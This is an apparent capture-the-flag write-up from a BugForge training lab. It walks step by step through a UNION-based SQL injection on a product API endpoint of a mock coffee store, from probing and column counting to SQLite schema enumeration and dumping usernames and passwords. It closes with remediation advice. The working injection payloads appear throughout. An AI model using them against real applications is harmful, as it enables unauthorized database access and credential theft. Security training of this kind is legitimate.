---
title: "CAFE CLUB - Bugforge Daily Challenge"
description: A UNION-based SQL injection writeup from BugForge Labs. The login page looked safe, but a product endpoint wasn't - this is the full process from finding the injection to dumping the users table and getting the flag.
date: 2026-06-19 00:00:00 +0545
categories: [BugForge, SQL Injection]
tags: [sqli, ctf, sqlite, union-based, bugforge]
image: /assets/images/cafeclub/chaiInRainAlone1.gif
---

I do [BugForge labs](https://bugforge.io) on a daily basis and keep all of them as writeups in my [GitHub](https://github.com/myselfrabin/bugforge_labs). Most stay there, but I decided to bring this one over here since it had good technical depth worth sharing.

This one's a CTF(Daily Challenge) from BugForge Labs - a premium coffee store called Cafe Club. The login page was clean, no SQLi there, but a product endpoint wasn't so lucky. Here's the full process I followed to find it, confirm it, and dump the users table.

> **Platform:** BugForge Labs
> **Category:** Web Application Exploitation
> **Vulnerability:** SQL Injection (UNION-Based)
{: .prompt-info }

## The Big Picture

Here's the attack chain in simple terms:

```
Register account → Test login page for SQLi (fails) → Find hint pointing to SQLi
→ Discover SQLi on product endpoint → Confirm injection with OR 1=1
→ Find column count → Identify database type (SQLite) → Find table names
→ Find column names in users table → Extract username & password → Get the flag
```

## Step 1 - Register & Login

As always, the lab starts with a register/login page. I created a test account:

```
username   : test
email      : test@gmail.com
password   : 123456
full name  : TESTER ME
address    : Nepal
phone num  : 555-134
```

After registering, I was automatically logged in.

## Step 2 - Testing the Login Page for SQLi

I spent a while exploring the app without much luck, so I checked the hint - it pointed straight at **SQL Injection**.

The first place to try SQLi is always the login form, so I tried:

```
username : test' OR 1=1 -- -
password : 1
```

The app responded with **"Invalid credentials"** - meaning the login page is **not** vulnerable to SQLi.

[![SQLi Attempt on Login Page](/assets/images/cafeclub/sqlionlogin.png)](/assets/images/cafeclub/sqlionlogin.png)
_SQLi attempt on login page - failed_

## Step 3 - Looking Elsewhere

This app is a premium coffee collection store, so I started testing other inputs and requests across the site using a simple probe payload:

```
' -- -
```

[![Premium Coffee Webpage](/assets/images/cafeclub/premiumcoffeewebpage.png)](/assets/images/cafeclub/premiumcoffeewebpage.png)
_The premium coffee store_

While exploring, I found an endpoint that lists product details:

```
GET /api/products
```

[![Product Listing Endpoint](/assets/images/cafeclub/product.png)](/assets/images/cafeclub/product.png)
_Product listing endpoint_

## Step 4 - Spotting Strange Behavior on a Single Product

Viewing a single product works like this:

```
GET /api/products/4
```

Testing for SQLi here revealed something odd:

```
/api/products/4'  -- -    →  "Product not found"
/api/products/4   -- -    →  Returns the correct product
```

[![Product Found Without the Single Quote](/assets/images/cafeclub/sqliworkingwithoutsinglequote.png)](/assets/images/cafeclub/sqliworkingwithoutsinglequote.png)
_Works fine without the single quote_

[![Product Not Found With the Single Quote](/assets/images/cafeclub/sqlinotworkingwithsinglequote.png)](/assets/images/cafeclub/sqlinotworkingwithsinglequote.png)
_Breaks with the single quote_

> All payloads here are URL-encoded - `'` becomes `%27` and a space becomes `%20`.
{: .prompt-tip }

This inconsistent behavior - working fine without the quote, breaking with it - is a classic sign that user input is being inserted directly into a SQL query.

## Step 5 - Confirming the SQL Injection

To confirm it for real, I tested a condition that should always evaluate to true:

```
/api/products/4 OR 1=1 -- -
```

This executed successfully, confirming the SQL injection.

[![SQL Injection Confirmed](/assets/images/cafeclub/SQLICONFIRM.png)](/assets/images/cafeclub/SQLICONFIRM.png)
_SQL injection confirmed_

## Step 6 - Finding the Number of Columns

Before extracting any data with `UNION SELECT`, I needed to know how many columns the original query returns. There are two common ways to do this:

1. **`ORDER BY <number>`** - keeps working until you pass the actual column count, then errors out
2. **`UNION SELECT NULL, NULL, ...`** - keeps failing until the number of `NULL`s matches the column count

Using `ORDER BY`, the response stayed correct up through column 8, and broke at column 9 - meaning there are **8 columns** in total.

[![Found 8 Columns via ORDER BY](/assets/images/cafeclub/EIGHTNUMofcolumn.png)](/assets/images/cafeclub/EIGHTNUMofcolumn.png)
_8 columns found via ORDER BY_

Confirming the same with `UNION SELECT`:

```
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
```

[![Confirmed Column Count via UNION](/assets/images/cafeclub/numofcolumnswithunion.png)](/assets/images/cafeclub/numofcolumnswithunion.png)
_Column count confirmed via UNION_

## Step 7 - Finding the Database Type

With 8 confirmed columns, the next step was figuring out **which columns accept string data** (numeric columns will reject a string and throw an error). I tested this one column at a time:

```
UNION SELECT 'A',NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
UNION SELECT NULL,'A',NULL,NULL,NULL,NULL,NULL,NULL-- -
```

I checked each position to see if `'A'` reflected back in the response. Through this process, I found that the `id` and `price` columns reject strings, while the others accept them.

[![Finding String-Compatible Columns](/assets/images/cafeclub/stringcolumn.png)](/assets/images/cafeclub/stringcolumn.png)
_Finding string-compatible columns_

Next, I needed the database version using payloads from the [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) and [Tib3rius's SQLi Cheat Sheet](https://tib3rius.com/sqli.html):

```
@@VERSION         → failed
VERSION()         → failed
sqlite_version()  → returned 3.44.2
```

This confirmed the backend database is **SQLite**.

[![Database Version Retrieved](/assets/images/cafeclub/gotDbversion.png)](/assets/images/cafeclub/gotDbversion.png)
_Database version retrieved_

## Step 8 - Finding Table Names

SQLite stores its schema information in a special table called `sqlite_master`. To list table names:

```sql
SELECT tbl_name FROM sqlite_master WHERE type='table'
```

Injected into one of the string-compatible columns:

```
UNION SELECT NULL,tbl_name,NULL,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'-- -
```

This returned a table called **`cart_items`**.

[![Found Table Name: cart_items](/assets/images/cafeclub/tablenamecartitems.png)](/assets/images/cafeclub/tablenamecartitems.png)
_Found table name: cart_items_

Since this only shows one table per row, I used `GROUP_CONCAT()` to pull every table name into a single response:

```
UNION SELECT NULL,GROUP_CONCAT(tbl_name),NULL,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'-- -
```

This revealed the full list of tables - and one called **`users`** immediately stood out.

[![All Table Names via GROUP_CONCAT](/assets/images/cafeclub/concatbytables.png)](/assets/images/cafeclub/concatbytables.png)
_All table names via GROUP_CONCAT_

> `SELECT tbl_name` returns table names one row at a time. `GROUP_CONCAT(tbl_name)` merges them all into a single string in one row - much faster to read.
{: .prompt-tip }

## Step 9 - Finding Column Names in the `users` Table

Rather than guessing what columns the `users` table has, I pulled its actual schema definition:

```sql
SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'
```

Injected as:

```
UNION SELECT NULL,MAX(sql),NULL,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE tbl_name='users'-- -
```

This returned the full `CREATE TABLE` statement, showing all column names including `username` and `password`.

[![Column Names for Users Table](/assets/images/cafeclub/listsofcolumns.png)](/assets/images/cafeclub/listsofcolumns.png)
_Column names for users table_

## Step 10 - Extracting Username & Password

With the column names confirmed, I extracted the actual data:

```
UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL,NULL FROM users-- -
```

The response contained the **flag** sitting in the password field.

[![Flag Retrieved from Users Table](/assets/images/cafeclub/gotTheflag.png)](/assets/images/cafeclub/gotTheflag.png)
_Flag retrieved from users table_

## How Could This Be Fixed?

| Issue | Fix |
|---|---|
| User input concatenated directly into SQL query | Use **parameterized queries / prepared statements** everywhere, including path parameters like `/api/products/<id>` |
| Database schema info accessible via injection | Restrict database permissions so the app's DB user can't query `sqlite_master` or other schema tables unnecessarily |
| Sensitive data (passwords) stored without protection | Always hash passwords (e.g., bcrypt) so even a successful extraction doesn't yield plaintext credentials |

## Key Takeaways

- **Not every input field is vulnerable - keep testing.** The login form was safe, but a path parameter (`/api/products/4`) wasn't.
- **Weird, inconsistent behavior is a strong signal.** A request that works fine without a quote but breaks with one is a textbook sign of SQL injection.
- **UNION-based SQLi is a structured process**: confirm injection → find column count → find string-compatible columns → fingerprint the database → enumerate tables → enumerate columns → extract data. Following this order makes it much easier to land back on track.
- **`sqlite_master` is SQLite's version of `information_schema`** - knowing the database type changes which schema tables you query.
- Cheat sheets (PortSwigger, Tib3rius) are extremely useful for adapting payloads to different database engines.

---

> *Happy Hacking!*

Challenge: BugForge Daily - Cafe Club | June 19th, 2026